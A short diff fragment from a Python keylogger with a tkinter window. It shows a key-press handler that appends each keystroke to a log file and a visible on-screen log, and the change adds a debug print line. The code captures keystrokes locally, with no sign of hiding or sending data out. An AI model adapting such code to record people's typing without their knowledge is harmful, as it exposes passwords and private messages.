@@ -21,6 +21,7 @@ def on_press(key):
             with open(log_file, "a") as f:
                 f.write(f" [{key}] ")
             log_area.insert(tk.END, f" [{key}] ")
+            print("Writing to log file")
 
 def start_keylogger():
     global keylogger_active
